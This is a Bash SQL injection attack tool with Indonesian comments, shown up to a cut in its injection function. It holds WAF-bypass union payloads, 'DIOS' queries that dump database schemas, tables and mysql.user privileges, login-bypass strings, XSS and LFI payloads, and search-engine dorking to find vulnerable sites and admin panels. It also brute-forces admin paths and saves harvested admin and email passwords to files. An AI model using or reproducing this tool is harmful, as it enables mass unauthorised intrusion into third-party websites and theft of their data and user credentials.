#----- SQL INJECTION -----#
#----- CODE BY KIMAK -----#
#!/usr/bin/env bash


xpl="test" #jgn di ubah!!!
xpl1="' or 1=1 limit 1-- -+"
xpl2="'=''or'"
xpl3="admin"
xpl4="'=''or'@gmail.com"
list_xploit="xploit.txt"
list_direct="redirectdir.txt"
#boot sqli
boot_empas="$?"
auto_get="email|mail|pass|pssw"
#warna
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
O='\033[0;33m'
P="\033[2m"
BL='\033[0;96m\033[2m'
B='\033[1;36m'
BR="\033[0;34m"
U="\033[0;35m"
#di sarankan untuk yg sudah pengalaman sqli manual
#Hati hati jika mau mengubah query perhatikan variabel nya
#Semua variabel yg ada sangat sensitiv bisa mengubah total kinerja tools
#jdi perhatikan besar kecil nya huruf nya yaa.... :)
#SELAMAT BERKARYA :")
time_out="30" #time out loading default 30 detik
corect="y" #auto corect
#output ressult
injected_site="injected.txt" #Result history site yg injected dri pertama kali psqli di gunakan
result_vuln="vuln-sqli.txt" #Result vuln sqli site dari dorking  5 search engine
admin_site="admin-site.txt" #site yang berisikan admin user pass
email_site="empass-site.txt" #site yg berisikan email pass
error_site="error.txt" #site yg tidak bisa di inject
dork_result="dork.txt" #hasil dari dork generator
result_admin="login-site.txt" #login page hasil admin finder
#input
union_select="union.txt" #berisikan union style yg bisa kamu edit sesukamu
list_country=".sites" #list berisikan lock country untuk dork generator
parameter_gen=".key" #list berisikan parameter untuk dork generator
panel_admin="admin_panel.txt"
#order by
order_start="1"
order_by="50" #order total count colom default 50
#bypasing white space style
w1="/**8**/"
w2="%23%0a"
w3="/*!50000"
w3a="*/"
w4="%250a"
w5="%23++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a"
w6="%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0a"
w7="+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%09"
w8="--%20-%0A"
w9="/**8**/DisTIncTrow%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0a"
w10="%2523AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0A"
#union bypasing
union="/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/"
union1="/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/"
union2="%20and%200+/**8**//*!50000UniON*/%20/*!50000sEleCt*/%20"
bof="+and+mod(9,9)+/*!50000UniON*/%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0A/*!50000sEleCt*/+"
bof2="+and+mod(9,9)+/*!50000UniON*/%09++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/*!50000sEleCt*/+"
urlencode="+div+0+/*!50000%55NIoN*/+/*!50000%53eLEct*/+"
double_url="+and+mod(9,9)%20unION%2523aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aSelect%20"
whitespaces="%0aand%0a0%0aUniON%0aselect%0A"
basic_1="/**//*!12345UNION+SELECT*//**/"
#DIOS METHOD
local="n" # ganti ke "y" untuk local variabel method dios
#JIKA MAU GANTI QUERY SESUAIKAN VARIABEL NYA
dios4="(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0x3a3a,2)),@,2))" #madblood no waf
dios3="(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(%60InFoRMAtiON_sCHeM%60.%60ColUMNs%60)where(%60TAblE_sCHemA%60=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c6c693e,TaBLe_nAMe,0x3a3a,column_name))))a)" #Zen waf
dios2="export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)" #madblood waf
dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)" #basic waf
dios9="(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=database${by}/**_**/())and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"
#jika mau ganti dios table dn colom ganti dengan ($table = untuk table) ($colom = untuk colom)
Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon}))))x)"
Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon})+FROM+${table})"
Dump2="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
Dump3="(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon})+/*!50000FROM*/+${table})"
Dump4="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
Dump99="(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
Dump9="(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+${table})"
#query dump
Dump_db="(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)"
ddbs="(select%20group_concat(0x3c6c693e,/*!50000schema_name*/,0x3c6c693e)%20/*!50000from*/%20/*!50000information_schema.schemata*/)"
ddbs1="(SELECT%20/*!50000GROUP_CONCAT*/(0x3c6c693e,/*!50000schema_name*/,0x3c6c693e)%20/*!50000FROM*/%20/*!50000INFORMATION_SCHEMA.SCHEMATA*/)"
ddbs2="(SELECT%20(@x)%20/*!50000FROM*/%20(SELECT%20(@x:=0x00),(@NR_DB:=0),(SELECT%20(0)%20/*!50000FROM*/%20(/*!50000INFORMATION_SCHEMA.SCHEMATA*/)%20/*!50000WHERE*/%20(@x)%20IN%20
(@x:=CONCAT/**8**/(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x3c6c693e,/*!50000schema_name*/,0x3c6c693e))))x)"
ddbs9="(select%20group_concat${by}(0x3c6c693e,schema_name,0x3c6c693e)%20${by}from${by}%20${by}information_schema.schemata${by})"
#into out file
#cooming soon
cek_db="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=0x6d7973716c)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
cek_y="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/(mysql.user)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,file_priv))))x)"
#dork configuration
sqli_error="Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-" #hati-hati delimiter mengunakan "|"
admin_dork="admin/ admin.php login/ login.php" #wordlist adminfinder dorking
dork_login="login" #login dork
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e" #jika mau diganti alert nya beri tulisan "kedjaw3n"
lfi_count="5" #hitungan dir ../ LFI scan
lfi_payload="etc/passwd"
#debug mode /!\ ( developer testing ) /!\
debug="$1"
#package checker
dependencies=( "grep" "curl" "gawk" "sed" "diff" "awk")
for pkg in "${dependencies[@]}";do
    command -v $pkg >/dev/null 2>&1 || { echo -e >&2 "${O}$pkg ${N}: belum terinstall - akan menginstallnya" && apt-get install $pkg -y
    }
done

get_config(){
  echo "config not found wait downloading file...."
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "agressivcode.6te.net/.sites"  > .sites
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "agressivcode.6te.net/.key"  > .key
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "agressivcode.6te.net/union.txt" > union.txt
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "agressivcode.6te.net/admin_panel.txt" > $panel_admin
  echo "Done have fun.... :)"
  sleep 1
  clear
}

if [ -f union.txt ]
then
   if [ -f .key ];then
      if [ -f .sites ];then
          if [ -f admin_panel.txt ];then
             congorna="ada"
          else
             get_config
          fi
      else
         get_config
      fi
   else
      get_config
   fi
else
  get_config
fi

dora() {
  dork=$(echo "$dork" | sed "s/ /+/g")
  rm -rf .bad .wp .live .result_dork .redi
echo -e "${N}[${G}*${N}]\033[2m Mencari halaman login dengan dorking${N}"
trap break INT
for dork in $dork
do
   echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..." | tr "+" " ";rm -rf .result_dork .not
    for COUNT in $(seq 1 $pa)
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from google page $COUNT${N}"
         dork2=$(echo "$dork" | sed "s,inurl:,+,g")
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "https://www.google.com/search?q=${dork2}=&start=${COUNT}" -L | grep -Po '<a href="\K.*?(?=".*)' | egrep -o "(http(s)?://){1}[^'\"]+" | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/instagram/d' | sed '/youtube/d' | sed '/google/d' | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from ask.com page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "uk.ask.com/web?q=$dork&page=${COUNT}" -sL | grep -Po "blank\" href='[^']*'" | cut -d "'" -f2 | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from yahoo page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "https://search.yahoo.com/search?ei=UTF-8&gprid=&fr2=sb-top&p=$dork&b=${COUNT}" -sL | grep -Po 'lh-24\" href="[^"]*"' | cut -d '"' -f3 | sed "/amp;/d" | sed "/yahoo/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
   done
done
echo -e "${N}\033[2mcek login page from result dork"
echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
trap break 2 INT
if cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir" >/dev/null
then
  for site3 in $(cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir")
  do
    ngecurl=$(curl -D - -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site3" | tr -d '\0' | sed 's/\r$//')
   if echo "$ngecurl" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurl" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site3"
                echo "$site3" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo -e "site3: $site3\n$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site3"
                echo "$site3" >> $result_admin
                echo "$site3" >> output/$dir/admin-login.txt
                echo "$site3" >> .live
             fi
        else
            echo -e "\x1b[0m${N}[${G}+${N}] ${G}\033[2m200 OK ${N}:\033[2m $site3"
            echo "$site3" >> .live
        fi
        continue
    else
        if echo "$ngecurl" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site3"
                echo "$site3" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo -e "site3: $site3\n$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site3"
                echo "$site3" >> $result_admin
                echo "$site3" >> output/$dir/admin-login.txt
                echo "$site3" >> .live
             fi
        fi
        echo -e "${N}[${R}!${N}] \033[2mWRONG : $site3"
        echo "$site3" >> .bad
    fi
done
else
   echo -e "${N}[${R}!${N}] ${R}\033[2mperiksa koneksi atau hasil dorking tidak ada${N}"
fi
trap - INT
echo -e "${N}${O}Mencoba admin no redirect"
echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
trap break 3 INT
for site in $(cat .live 2>/dev/null)
do
echo -e "\n\x1b[0m${N}[${G}+${N}]${BL} Site: $site${N}"
for admin in /home/ /home.php /Dashboard.php /Dashboard /index.php $(cat $list_direct 2>/dev/null)
  do
    if echo $site | awk -F "/" '{print $(NF)}' | grep "." >/dev/null
    then
      tmp=$(echo $site | awk -F "/" '{print $(NF)}')
      site=$(sed "s#$tmp##g" <<<"$site")
    fi
    ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
    if echo "$ngecurl" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site/$admin" | sed "s|//||g"
                echo "$site/$admin" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${O}!${N}] ${P}NOT FOUND ${N}:\033[2m $site/$admin" | sed "s|//||g"
                echo "$site/$admin" >> $result_admin
                echo "$site/$admin" >> output/$dir/admin-login.txt
                echo "bad" >> .live
             fi
        else
            echo -e "\x1b[0m${N}[${G}+${N}] ${G}Noredirect ${N}:\033[2m $site/$admin" | sed "s|//||g"
            echo "$site/$admin" | sed "s|//||g" >> .redi
            echo "$site/$admin" | sed "s|//||g" >> Noredirect.txt
        fi
        continue
    else
        echo -e "${N}[${R}!${N}] \033[2mNOT FOUND : $site/$admin" | sed "s|//||g"
        echo "$site/$admin" >> .bad
    fi
done
trap - INT
done
trap - INT
if [[ -f .live ]];then
   echo -e "${N}${BL}mengumpulkan login yang di temukan"
   for F in `cat .live 2>/dev/null | sort -u | uniq -i`;do echo -e "\x1b[0m${N}[${O}*${N}] ${G}FOUND ${N}:\033[2m $F";done
   echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result login found saved ${G}output/$dir/admin-login.txt${N}"
   echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
   echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat .redi 2>/dev/null | wc -l) vuln no redirect${N}"
   echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
   echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
else
   echo -e "${R}\033[2mMaaf gagal menemukan page login yang di cari\ncoba ubah wordlist dan racik sendiri"
   gagal="y"
fi
}

adminfin() {
dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
login="y"
rm -rf .bad .wp .live .result_dork
echo -e "${N}[${G}*${N}]\033[2m Mencari halaman login dengan dorking${N}"
pa="1"
trap break INT
for dork in $dork_login+inurl:$site
do
   echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..." | tr "+" " ";rm -rf .result_dork .not
    for COUNT in $(seq 1 $pa)
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from google page $COUNT${N}"
         dork2=$(echo "$dork" | sed "s,inurl:,+,g")
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "https://www.google.com/search?q=${dork2}=&start=${COUNT}" -L | grep -Po '<a href="\K.*?(?=".*)' | egrep -o "(http(s)?://){1}[^'\"]+" | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/instagram/d' | sed '/youtube/d' | sed '/google/d' | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from ask.com page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "uk.ask.com/web?q=$dork&page=${COUNT}" -sL | grep -Po "blank\" href='[^']*'" | cut -d "'" -f2 | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from yahoo page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "https://search.yahoo.com/search?ei=UTF-8&gprid=&fr2=sb-top&p=$dork&b=${COUNT}" -sL | grep -Po 'lh-24\" href="[^"]*"' | cut -d '"' -f3 | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
   done
done
echo -e "${N}\033[2mfind login page from result dork"
echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
trap break 2 INT
if cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir" >/dev/null
then
  for site3 in $(cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir")
  do
    ngecurl=$(curl -D - -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site3" | tr -d '\0' | sed 's/\r$//')
   if echo "$ngecurl" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurl" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site3"
                echo "bad" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo -e "site3: $site3\n$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site3"
                echo "$site3" >> $result_admin
                echo "$site3" >> output/$dir/admin-login.txt
                echo "bad" >> .live
             fi
        else
            echo -e "\x1b[0m${N}[${G}+${N}] ${G}\033[2m200 OK ${N}:\033[2m $site3"
            echo "bad" >> .live
        fi
        continue
    else
        if echo "$ngecurl" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site3"
                echo "bad" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo -e "site3: $site3\n$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site3"
                echo "$site3" >> $result_admin
                echo "$site3" >> output/$dir/admin-login.txt
                echo "bad" >> .live
             fi
        fi
        echo -e "${N}[${R}!${N}] \033[2mWRONG : $site3"
        echo "bad" >> .bad
    fi
done
else
   echo -e "${N}[${R}!${N}] ${R}\033[2mperiksa koneksi atau hasil dorking tidak ada${N}"
fi
echo -e "${N}\033[2mfind login page use bruteforce site"
echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
trap break 3 INT
for admin in $(cat $panel_admin | sed 's/\r$//' | tr -d "\0")
  do
    ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
    if echo "$ngecurl" | grep -Po "200 OK" >/dev/null
    then
        if echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null
        then
             if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
                echo -e "\x1b[0m${N}[${O}+${N}] ${O}\033[2mwordpress ${N}:\033[2m $site/$admin"
                echo "bad" >> .wp
             else
                found="y"
                if [[ "$debug" = "y" ]];then
                   echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in"
                fi
                mkdir -p output/$dir
                echo -e "\x1b[0m${N}[${G}+${N}] ${G}FOUND ${N}:\033[2m $site/$admin"
                echo "$site/$admin" >> $result_admin
                echo "$site/$admin" >> output/$dir/admin-login.txt
                echo "bad" >> .live
             fi
        else
            echo -e "\x1b[0m${N}[${G}+${N}] ${G}\033[2m200 OK ${N}:\033[2m $site/$admin"
            echo "bad" >> .live
        fi
        continue
    else
        echo -e "${N}[${R}!${N}] \033[2mNOT FOUND : $site/$admin"
        echo "bad" >> .bad
    fi
done
trap - INT
if [[ -f .live ]];then
   echo -e "${N}${BL}mengumpulkan login yang di temukan"
   for F in `cat output/$dir/admin-login.txt 2>/dev/null | sort -u | uniq -i`;do echo -e "\x1b[0m${N}[${O}*${N}] ${G}FOUND ${N}:\033[2m $F";done
   echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result login found saved ${G}output/$dir/admin-login.txt${N}"
   echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
   echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
   echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
else
   echo -e "${R}\033[2mMaaf gagal menemukan page login yang di cari\ncoba ubah wordlist dan racik sendiri"
fi
}

esql() {
  waff="n"
  site=$(echo "$site" | sed "s/'//g" | sed "s/%27//g")
  dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  echo -e "\n\x1b[0m${N}[${BL}`date +%T`${N}] ${N}${dir}$N conection checking"
  echo -ne "\x1b[0m${N}[${BL}`date +%T`${N}] mencoba cek vuln dengan koma "
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site
